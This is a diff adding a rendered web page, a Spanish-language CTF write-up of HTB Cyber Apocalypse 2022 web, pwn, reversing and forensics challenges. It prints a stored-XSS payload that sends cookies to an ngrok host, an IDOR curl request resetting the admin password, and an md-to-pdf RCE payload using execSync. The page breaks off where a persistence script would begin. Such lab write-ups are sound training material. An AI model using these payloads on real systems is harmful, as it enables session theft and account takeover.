+</li>
+        
+          <li class="md-nav__item">
+  <a href="#forensics" class="md-nav__link">
+    <span class="md-ellipsis">
+      Forensics
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Forensics">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#puppeteer" class="md-nav__link">
+    <span class="md-ellipsis">
+      Puppeteer
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Puppeteer">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stats_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      Stats
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#solucion_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      Solución
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#golden-persistence" class="md-nav__link">
+    <span class="md-ellipsis">
+      Golden Persistence
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Golden Persistence">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stats_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      Stats
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#solucion_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      Solución
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Solución">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#script-completo" class="md-nav__link">
+    <span class="md-ellipsis">
+      Script completo
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#misc" class="md-nav__link">
+    <span class="md-ellipsis">
+      Misc
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Misc">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#compressor" class="md-nav__link">
+    <span class="md-ellipsis">
+      Compressor
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Compressor">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stats_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      Stats
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#solucion_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      Solución
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#composicion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Composición
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+  
+<nav class="md-tags" >
+  
+    
+    
+    
+      <a href="../../tags/#stored-xss" class="md-tag">Stored XSS</a>
+    
+  
+    
+    
+    
+      <a href="../../tags/#idor" class="md-tag">IDOR</a>
+    
+  
+    
+    
+    
+      <a href="../../tags/#rce-md-to-pdf" class="md-tag">RCE (md-to-pdf)</a>
+    
+  
+    
+    
+    
+      <a href="../../tags/#binary-analysis-ida" class="md-tag">Binary Analysis (IDA)</a>
+    
+  
+    
+    
+    
+      <a href="../../tags/#microsoft-windows-event-logs-analysis-evtx" class="md-tag">Microsoft Windows Event Logs Analysis (evtx)+</a>
+    
+  
+    
+    
+    
+      <a href="../../tags/#ntuserdat-analysis" class="md-tag">NTUSER.dat Analysis</a>
+    
+  
+    
+    
+    
+      <a href="../../tags/#gtfobins-zip" class="md-tag">GTFOBins (zip)</a>
+    
+  
+</nav>
+
+
+  
+  
+    
+      
+    
+    <a href="https://github.com/srrequiem/Secronomicon/raw/main/docs/CTFs/HTB Cyber Apocalypse 2022/README.md" title="Ver código fuente de esta página" class="md-content__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 18c.56 0 1 .44 1 1s-.44 1-1 1-1-.44-1-1 .44-1 1-1m0-3c-2.73 0-5.06 1.66-6 4 .94 2.34 3.27 4 6 4s5.06-1.66 6-4c-.94-2.34-3.27-4-6-4m0 6.5a2.5 2.5 0 0 1-2.5-2.5 2.5 2.5 0 0 1 2.5-2.5 2.5 2.5 0 0 1 2.5 2.5 2.5 2.5 0 0 1-2.5 2.5M9.27 20H6V4h7v5h5v4.07c.7.08 1.36.25 2 .49V8l-6-6H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h4.5a8.2 8.2 0 0 1-1.23-2"/></svg>
+    </a>
+  
+
+
+<h1 id="htb-cyber-apocalypse-ctf-2022">HTB Cyber Apocalypse CTF 2022 <!-- omit from toc --></h1>
+<p>Cyber Apocalypse CTF 2022 - Intergalactic Chase</p>
+<p><img alt="Cover de CTF" src="images/cover.jpg" /></p>
+<h2 id="indice">Índice <!-- omit from toc --></h2>
+<ul>
+<li><a href="#intro">Intro</a></li>
+<li><a href="#retos">Retos</a></li>
+<li><a href="#web">Web</a><ul>
+<li><a href="#kryptos-support">Kryptos Support</a></li>
+<li><a href="#stats">Stats</a></li>
+<li><a href="#solución">Solución</a></li>
+<li><a href="#blinkerfluids">BlinkerFluids</a></li>
+<li><a href="#stats-1">Stats</a></li>
+<li><a href="#solución-1">Solución</a></li>
+</ul>
+</li>
+<li><a href="#pwn">Pwn</a><ul>
+<li><a href="#space-pirate-entrypoint">Space Pirate: Entrypoint</a></li>
+<li><a href="#stats-2">Stats</a></li>
+<li><a href="#solución-2">Solución</a></li>
+</ul>
+</li>
+<li><a href="#reversing">Reversing</a><ul>
+<li><a href="#wide">WIDE</a></li>
+<li><a href="#stats-3">Stats</a></li>
+<li><a href="#solución-3">Solución</a></li>
+</ul>
+</li>
+<li><a href="#forensics">Forensics</a><ul>
+<li><a href="#puppeteer">Puppeteer</a></li>
+<li><a href="#stats-4">Stats</a></li>
+<li><a href="#solución-4">Solución</a></li>
+<li><a href="#golden-persistence">Golden Persistence</a></li>
+<li><a href="#stats-5">Stats</a></li>
+<li><a href="#solución-5">Solución</a><ul>
+<li><a href="#script-completo">Script completo</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#misc">Misc</a><ul>
+<li><a href="#compressor">Compressor</a></li>
+<li><a href="#stats-6">Stats</a></li>
+<li><a href="#solución-6">Solución</a></li>
+<li><a href="#composición">Composición</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="intro">Intro</h2>
+<p>El CTF de Cyber Apocalypse volvió este año, bajo una temática intergaláctica estando disponible del 14 al 20 de Mayo del 2022. Mediante <a href="https://www.hackthebox.com/events/cyber-apocalypse-2022">este enlace</a> se puede obtener más información del evento.</p>
+<p>Aquí se encuentran las soluciones de los retos que pude resolver durante mi participación.</p>
+<p><em>El write-up aquí presente fue generado por medio de <a href="https://github.com/srrequiem/CTFScrapper">CTFScrapper</a> para la creación de un entorno de trabajo y para la descarga de los archivos de los retos, disponibles en <a href="https://github.com/srrequiem/CTF-Challenge-Compilation">mi compendio de retos</a>.</em></p>
+<h2 id="retos">Retos</h2>
+<h3 id="web">Web</h3>
+<h4 id="kryptos-support">Kryptos Support</h4>
+<h5 id="stats">Stats</h5>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Info</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Difficulty</td>
+<td>easy</td>
+</tr>
+<tr>
+<td>Description</td>
+<td>The secret vault used by the Longhir's planet council, Kryptos, contains some very sensitive state secrets that Virgil and Ramona are after to prove the injustice performed by the commission. Ulysses performed an initial recon at their request and found a support portal for the vault. Can you take a look if you can infiltrate this system?</td>
+</tr>
+<tr>
+<td>File</td>
+<td>-</td>
+</tr>
+</tbody>
+</table>
+<h5 id="solucion">Solución</h5>
+<p>Después de navegar y revisar el sitio disponible, dado que se menciona que el admin del sitio visualizará los tickets de servicio dados de alta, se puede suponer que se trata de un ataque XSS.</p>
+<p>Haciendo uso del payload:</p>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;&quot;</span> <span class="na">onerror</span><span class="o">=</span><span class="s">fetch(&quot;https://a748-189-203-27-57.ngrok.io/&quot;+document.cookie).then()</span> <span class="p">/&gt;</span>
+</span></code></pre></div>
+<p><img alt="XSS Payload" src="images/web/kryptos_support/xss_1.png" /></p>
+<p>Con la intención de robar una cookie de sesión correspondiente a la del admin, como lo menciona el sitio.</p>
+<p><img alt="XSS Execution" src="images/web/kryptos_support/xss_2.png" /></p>
+<p>De acuerdo a como está construida la cookie, se identificó que se trata de un JWT.</p>
+<p><img alt="JWT" src="images/web/kryptos_support/jwt.png" /></p>
+<p>Al buscar más información siendo que con la cookie de sesión no revela ningún cambio al utilizarla se identificó en el código fuente de <code>http://&lt;challenge url&gt;/login</code> se revela un directorio disponible haciendo uso de la cookie obtenida.</p>
+<p><img alt="Login source code" src="images/web/kryptos_support/login_1.png" /></p>
+<p><code>login.js</code></p>
+<p><img alt="Feature discover" src="images/web/kryptos_support/login_2.png" /></p>
+<p>Vista de <code>http://&lt;challenge url&gt;/tickets</code> haciendo uso de la cookie obtenida.</p>
+<p><img alt="Tickets url" src="images/web/kryptos_support/tickets.png" /></p>
+<p>Vista de <code>http://&lt;challenge url&gt;/settings</code> haciendo uso de la cookie obtenida. Exponiendo la funcionalidad del cambio de contraseña del "usuario logueado".</p>
+<p><img alt="Settings url" src="images/web/kryptos_support/settings_1.png" /></p>
+<p><img alt="Settings source code" src="images/web/kryptos_support/settings_2.png" /></p>
+<p>Al visualizar el código se puede identificar que el parámetro <code>uid</code> es enviado al hacer uso de la funcionalidad.</p>
+<p><img alt="Settings js code" src="images/web/kryptos_support/settings_3.png" /></p>
+<p>Buscando invocar la funcionalidad haciendo uso de <code>curl</code> se envió el uid del moderador como prueba.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>curl<span class="w"> </span>-v<span class="w"> </span>http://13868188223:30914/api/users/update<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;password&quot;:&quot;123456&quot;,&quot;uid&quot;:100}&#39;</span><span class="w"> </span>--cookie<span class="w"> </span><span class="s2">&quot;session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI2NDYxMzd9Z.HRsjja_ehTEx7FxfjilkTjO3_gRsHkt_jmovFZY1OA&quot;</span>
+</span></code></pre></div>
+<p><img alt="Respuesta de cambio con moderador" src="images/web/kryptos_support/password_1.png" /></p>
+<p>Habiéndo mencionado que se envía el <code>uid</code> en la petición, se decidió cambiar el varlor a 1 siendo que generalmente se reserva ese id para administradores.</p>
+<p><img alt="Respuesta de cambio con uid 1" src="images/web/kryptos_support/password_2.png" /></p>
+<p>Al haber sido satisfactorio el cambio de contraseña se puede realizar el login como admin, obteniendo de esta manera la bandera.</p>
+<p><img alt="Login como admin" src="images/web/kryptos_support/admin.png" /></p>
+<blockquote>
+<p>Flag: HTB{x55_4nd_id0rs_ar3_fun!!}</p>
+</blockquote>
+<h4 id="blinkerfluids">BlinkerFluids</h4>
+<h5 id="stats_1">Stats</h5>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Info</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Difficulty</td>
+<td>easy</td>
+</tr>
+<tr>
+<td>Description</td>
+<td>Once known as an imaginary liquid used in automobiles to make the blinkers work is now one of the rarest fuels invented on Klaus' home planet Vinyr. The Golden Fang army has a free reign over this miraculous fluid essential for space travel thanks to the Blinker Fluids™ Corp. Ulysses has infiltrated this supplier organization's one of the HR department tools and needs your help to get into their server. Can you help him?</td>
+</tr>
+<tr>
+<td>File</td>
+<td><a href="https://github.com/srrequiem/CTF-Challenge-Compilation/raw/main/202205_htb_cyber_apocalypse_ctf_2022_intergalactic_chase/files/web_blinkerfluids.zip">web_blinkerfluids.zip</a></td>
+</tr>
+</tbody>
+</table>
+<h5 id="solucion_1">Solución</h5>
+<p>Después de identificar la composición del código se encontró que:</p>
+<ul>
+<li>La bandera se encontraba en <code>/flag.txt</code>.</li>
+<li><a href="https://githubcom/simonhaenisch/md-to-pdf/issues/99">Una librería empleada es vulnerable a RCE (md-to-pdf)</a>.</li>
+<li>Por la configuación de la aplicación, sólo se permitía la obtención de archivos en el directorio <code>/static/invoices/</code>.</li>
+</ul>
+<p>Al capturar el contenido enviado se utilizó el siguiente payload como cuerpo del archivo markdown:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>---js\n((require(\&quot;child_process\&quot;))execSync(\&quot;cp /flag.txt /static/invoices/flag.txt\&quot;))\n---RCE
+</span></code></pre></div>
+<p><img alt="Request enviada" src="images/web/blinker_fluids/request.png" /></p>
+<p>Ejecutando así el payload y permitiendo navegar a donde se encuentra la bandera</p>
+<p><img alt="Bandera" src="images/web/blinker_fluids/flag.png" /></p>
+<blockquote>
+<p>Flag: HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls}</p>
+</blockquote>
+<h3 id="pwn">Pwn</h3>
+<h4 id="space-pirate-entrypoint">Space Pirate: Entrypoint</h4>
+<h5 id="stats_2">Stats</h5>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Info</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Difficulty</td>
+<td>easy</td>
+</tr>
+<tr>
+<td>Description</td>
+<td>D12 is one of Golden Fang's missile launcher spaceships. Our mission as space pirates is to highjack D12, get inside the control panel room, and access the missile launcher system. To achieve our goal, we split the mission into three parts. In this part, all we need to do is bypass the scanning system and open the gates so that we proceed further.</td>
+</tr>
+<tr>
+<td>File</td>
+<td><a href="https://github.com/srrequiem/CTF-Challenge-Compilation/raw/main/202205_htb_cyber_apocalypse_ctf_2022_intergalactic_chase/files/pwn_sp_entrypoint.zip">pwn_sp_entrypoint.zip</a></td>
+</tr>
+</tbody>
+</table>
+<h5 id="solucion_2">Solución</h5>
+<p>Con los archivos que disponibles se probó localmente el binario y a modo de prueba y error, se identificó que al hacer uso de la contraseña <code>1234</code> el binario lee los contenidos del archivo local <code>flag.txt</code>.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="m">1</span><span class="w"> </span>Scan<span class="w"> </span>card<span class="w"> </span>💳
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="m">2</span><span class="w"> </span>Insert<span class="w"> </span>password<span class="w"> </span>↪️
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>&gt;<span class="w"> </span><span class="m">2</span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Insert<span class="w"> </span>password:<span class="w"> </span><span class="m">1234</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Door<span class="w"> </span>opened,<span class="w"> </span>you<span class="w"> </span>can<span class="w"> </span>proceed<span class="w"> </span>with<span class="w"> </span>the<span class="w"> </span>passphrase:<span class="w"> </span>HTB<span class="o">{</span>f4k3_fl4g_4_t35t1ng<span class="o">}</span>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Invalid<span class="w"> </span>option!<span class="w"> </span>Intruder<span class="w"> </span>detected!<span class="w"> </span>🚨<span class="w"> </span>🚨
+</span></code></pre></div>
+<p>Por lo que de la misma manera se realizó el mismo proceso en la conexión remota disponible.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="m">1</span><span class="w"> </span>Scan<span class="w"> </span>card<span class="w"> </span>💳
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="m">2</span><span class="w"> </span>Insert<span class="w"> </span>password<span class="w"> </span>↪️
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>&gt;<span class="w"> </span><span class="m">2</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Insert<span class="w"> </span>password:<span class="w"> </span><span class="m">1234</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Door<span class="w"> </span>opened,<span class="w"> </span>you<span class="w"> </span>can<span class="w"> </span>proceed<span class="w"> </span>with<span class="w"> </span>the<span class="w"> </span>passphrase:<span class="w"> </span>HTB<span class="o">{</span>th3_g4t35_4r3_0p3n!<span class="o">}</span>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Invalid<span class="w"> </span>option!<span class="w"> </span>Intruder<span class="w"> </span>detected!<span class="w"> </span>🚨<span class="w"> </span>🚨
+</span></code></pre></div>
+<blockquote>
+<p>Flag: HTB{th3_g4t35_4r3_0p3n!}</p>
+</blockquote>
+<h3 id="reversing">Reversing</h3>
+<h4 id="wide">WIDE</h4>
+<h5 id="stats_3">Stats</h5>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Info</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Difficulty</td>
+<td>easy</td>
+</tr>
+<tr>
+<td>Description</td>
+<td>We've received reports that Draeger has stashed a huge arsenal in the pocket dimension Flaggle Alpha. You've managed to smuggle a discarded access terminal to the Widely Inflated Dimension Editor from his headquarters, but the entry for the dimension has been encrypted. Can you make it inside and take control?</td>
+</tr>
+<tr>
+<td>File</td>
+<td><a href="https://github.com/srrequiem/CTF-Challenge-Compilation/raw/main/202205_htb_cyber_apocalypse_ctf_2022_intergalactic_chase/files/rev_wide.zip">rev_wide.zip</a></td>
+</tr>
+</tbody>
+</table>
+<h5 id="solucion_3">Solución</h5>
+<p>Después de interactuar con el binario y ver las posibilidades ofrecidas, la opción que se visualiza como cifrada pide una contraseña para visualizar su contenido.</p>
+<p><img alt="Uso inicial" src="images/reversing/wide/initial.png" /></p>
+<p>Buscando el valor en duro mediante su ejecución en IDA, al revisar el flujo se puede ver un valor posible que pudiera ser usado como contraseña.</p>
+<p><img alt="Flujo al cargar archivo" src="images/reversing/wide/ida.png" /></p>
+<p>Obteniendo el valor: <code>sup3rs3cr3tw1d3</code>.</p>
+<p>Y al pasarse como contraseña, se obtuvo la bandera.</p>
+<p><img alt="Bandera" src="images/reversing/wide/flag.png" /></p>
+<blockquote>
+<p>Flag: HTB{str1ngs_4r3nt_4lw4ys_4sc11}</p>
+</blockquote>
+<h3 id="forensics">Forensics</h3>
+<h4 id="puppeteer">Puppeteer</h4>
+<h5 id="stats_4">Stats</h5>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Info</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Difficulty</td>
+<td>easy</td>
+</tr>
+<tr>
+<td>Description</td>
+<td>Planet Longhir is known for it's top-tier researchers. Due to their dedication in science and engineering, their military equipment is the most advanced one in the galaxy. In fact, the prototype DES-3000, a self-propelled precision-strike missile that is capable of reaching targets even in Ratnik galaxy, is being used to disable Galactic Federation's communication satellites. The mystery that Miyuki is trying to solve is, how the satellite's location was leaked since it is a top-sercret that only Galactic Federation's council is aware of. Help her analyse the Council's HQ event logs and solve this mystery.</td>
+</tr>
+<tr>
+<td>File</td>
+<td><a href="https://github.com/srrequiem/CTF-Challenge-Compilation/raw/main/202205_htb_cyber_apocalypse_ctf_2022_intergalactic_chase/files/forensics_puppeteer.zip">forensics_puppeteer.zip</a></td>
+</tr>
+</tbody>
+</table>
+<h5 id="solucion_4">Solución</h5>
+<p>Se uso como base la solución de un <a href="https://josh-vr.medium.com/hackthebox-event-horizon-forensics-challenge-writeup-b32839a3307d">reto similar que anteriormente HackTheBox había publicado</a>, que fue encontrado al buscar como realizar análisis a los tipos de archivos dados.</p>
+<p>Al revisar el mismo archivo indicado en el writeup (<code>Microsoft-Windows-PowerShell%4Operationalevtx</code>), que por suerte, también existe en los logs de eventos, se puede visualizar una serie de eventos que tienen que ver con la descripción del reto (contexto del evento).</p>
+<p><img alt="Coincidencias respecto al reto" src="images/forensics/puppeteer/coincidencias.png" /></p>
+<p>En uno de ellos se encuentra algo que por su composición se asume que es shellcode, al tratar de interpretar que es lo realiza antes de ejecutarse se puede visualizar que el código concatena dos arreglos de bytes declarados antes del shellcode asignando este nuevo valor a otra variable y posteriormente realiza un XOR a cada elemento con <code>0xd1</code></p>
+<p><img alt="Stages de códigos" src="images/forensics/puppeteer/stages.png" /></p>
+<ol>
+<li>Declaración de stages</li>
+<li>Concatenación</li>
+<li>XOR a cada elemento</li>
+</ol>
+<p>Se imprimió esta variable para saber su contenido, el cual, al decodearse de los decimales obtenidos a ascii se obtuvo la bandera, haciendo uso de <a href="https://gchq.github.io/CyberChef/#recipe=From_Decimal('Line%20feed',false)&amp;input=NzIKODQKNjYKMTIzCjk4CjUxCjExOQoxMDQKNTIKMTE0CjUxCjk1CjQ4CjEwMgo5NQoxMTYKMTA0CjUxCjk1Cjk4CjQ4CjQ4CjExNgo1Mwo5NQo0OAoxMDIKOTUKMTA2CjExNwoxMTUKMTE2CjQ5Cjk5CjUxCjQ2CjQ2CjQ2CjEyNQ">esta receta de CyberChef</a>.</p>
+<p>Modificación a script original:</p>
+<p><img alt="Modificación a script" src="images/forensics/puppeteer/modificacion.png" /></p>
+<p>Ejecución:</p>
+<p><img alt="Ejecución de script" src="images/forensics/puppeteer/ejecucion.png" /></p>
+<p>Decodeo de valores obtenidos para obtener bandera:</p>
+<p><img alt="Obtención de bandera" src="images/forensics/puppeteer/flag.png" /></p>
+<blockquote>
+<p>Flag: HTB{b3wh4r3_0f_th3_b00t5_0f_just1c3}</p>
+</blockquote>
+<h4 id="golden-persistence">Golden Persistence</h4>
+<h5 id="stats_5">Stats</h5>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Info</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Difficulty</td>
+<td>easy</td>
+</tr>
+<tr>
+<td>Description</td>
+<td>Emergency! A space station near Urkir was compromised. Although Urkir is considered to be the very embodiment of the neutral state, it is rich of fuel substances, something that Dreager is very much interested in. Thus, there are now fears that the intergalactic war will also affect this neutral planet. If Draeger and his mercenaries manage to maintain unauthorised access in Urkir's space station and escalate their privileges, they will soon be able to activate the station's defence mechanisms that are able to prevent any spaceship from entering Urkir's airspace. For now, the infected machine is isolated until the case is closed. Help Miyuki find their persistence mechanisms so they cannot gain access again.</td>
+</tr>
+<tr>
+<td>File</td>
+<td><a href="https://github.com/srrequiem/CTF-Challenge-Compilation/raw/main/202205_htb_cyber_apocalypse_ctf_2022_intergalactic_chase/files/forensics_golden_persistence.zip">forensics_golden_persistence.zip</a></td>
+</tr>
+</tbody>
+</table>
+<h5 id="solucion_5">Solución</h5>
+<p>Después de investigar acerca del análisis del archivo dado (<code>NTUSER.dat</code>), se encontró este <a href="https://www.youtube.com/watch?v=VmKvYRyTixw">write-up</a> en el que se hace uso de diferentes herramientas para análizar y navegar entre los registros del archivo, del cuál en el registro <code>/Software/Microsoft/Windows/CurrentVersion/Run</code> se identificó el uso de powershell con un parámetro poco convencional. Haciendo uso de <code>reglookup -p /Software/Microsoft/Windows/CurrentVersion/Run NTUSER.DAT</code>.</p>
+<p><img alt="Registro poco convencional" src="images/forensics/golden_persistence/reglookup_1.png" /></p>
+<p>Después de identificar que el parámetro se encontraba codificado en base64 y desencodeándolo, se puede visualizar el script utilizado.</p>
+<p><img alt="Decodeo de base64" src="images/forensics/golden_persistence/decodeo.png" /></p>
+<p>De acuerdo al código, el script hace uso de los valores de los registros indicados por lo que en pasos consiguientes fue necesario buscar los mismos.</p>
+<p><img alt="Obtención de valor de registros" src="images/forensics/golden_persistence/registros.png" /></p>
+<p>Extrayendo de la misma manera los valores se pueden sustituir las variables correspondientes directamente.</p>
+<p><img alt="Valores cifrados" src="images/forensics/golden_persistence/valores_cifrados.png" /></p>
+<p>Al ejecutar la reconstrucción del script, aún presentaba inconsistencias de sintaxis, al limpiarlo para buscar una ejecución correcta quedó de la <a href="#script-completo">siguiente manera</a></p>
+<p><img alt="Ejemplo de inconsistencias" src="images/forensics/golden_persistence/inconsistencias.png" /></p>
+<h6 id="script-completo">Script completo</h6>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-5-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-5-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-5-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-5-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-5-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-5-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-5-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-5-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-5-10">10</a></span>
+<span class="normal"><a href="#__codelineno-5-11">11</a></span>
+<span class="normal"><a href="#__codelineno-5-12">12</a></span>
+<span class="normal"><a href="#__codelineno-5-13">13</a></span>
+<span class="normal"><a href="#__codelineno-5-14">14</a></span>
+<span class="normal"><a href="#__codelineno-5-15">15</a></span>
+<span class="normal"><a href="#__codelineno-5-16">16</a></span>
+<span class="normal"><a href="#__codelineno-5-17">17</a></span>
+<span class="normal"><a href="#__codelineno-5-18">18</a></span>
+<span class="normal"><a href="#__codelineno-5-19">19</a></span>
+<span class="normal"><a href="#__codelineno-5-20">20</a></span>
+<span class="normal"><a href="#__codelineno-5-21">21</a></span>
+<span class="normal"><a href="#__codelineno-5-22">22</a></span>
+<span class="normal"><a href="#__codelineno-5-23">23</a></span>
+<span class="normal"><a href="#__codelineno-5-24">24</a></span>
+<span class="normal"><a href="#__codelineno-5-25">25</a></span>
+<span class="normal"><a href="#__codelineno-5-26">26</a></span>
+<span class="normal"><a href="#__codelineno-5-27">27</a></span>
+<span class="normal"><a href="#__codelineno-5-28">28</a></span>
+<span class="normal"><a href="#__codelineno-5-29">29</a></span>
+<span class="normal"><a href="#__codelineno-5-30">30</a></span>
+<span class="normal"><a href="#__codelineno-5-31">31</a></span>
+<span class="normal"><a href="#__codelineno-5-32">32</a></span>
+<span class="normal"><a href="#__codelineno-5-33">33</a></span>
+<span class="normal"><a href="#__codelineno-5-34">34</a></span>
+<span class="normal"><a href="#__codelineno-5-35">35</a></span>
+<span class="normal"><a href="#__codelineno-5-36">36</a></span>
+<span class="normal"><a href="#__codelineno-5-37">37</a></span>
+<span class="normal"><a href="#__codelineno-5-38">38</a></span>
+<span class="normal"><a href="#__codelineno-5-39">39</a></span>
+<span class="normal"><a href="#__codelineno-5-40">40</a></span>
+<span class="normal"><a href="#__codelineno-5-41">41</a></span>
+<span class="normal"><a href="#__codelineno-5-42">42</a></span>
+<span class="normal"><a href="#__codelineno-5-43">43</a></span>
+<span class="normal"><a href="#__codelineno-5-44">44</a></span>
+<span class="normal"><a href="#__codelineno-5-45">45</a></span>
+<span class="normal"><a href="#__codelineno-5-46">46</a></span>
+<span class="normal"><a href="#__codelineno-5-47">47</a></span>
+<span class="normal"><a href="#__codelineno-5-48">48</a></span>
+<span class="normal"><a href="#__codelineno-5-49">49</a></span>
+<span class="normal"><a href="#__codelineno-5-50">50</a></span>
+<span class="normal"><a href="#__codelineno-5-51">51</a></span>
+<span class="normal"><a href="#__codelineno-5-52">52</a></span>
+<span class="normal"><a href="#__codelineno-5-53">53</a></span>
+<span class="normal"><a href="#__codelineno-5-54">54</a></span>
+<span class="normal"><a href="#__codelineno-5-55">55</a></span>
+<span class="normal"><a href="#__codelineno-5-56">56</a></span>
+<span class="normal"><a href="#__codelineno-5-57">57</a></span>
+<span class="normal"><a href="#__codelineno-5-58">58</a></span>
+<span class="normal"><a href="#__codelineno-5-59">59</a></span>
+<span class="normal"><a href="#__codelineno-5-60">60</a></span>
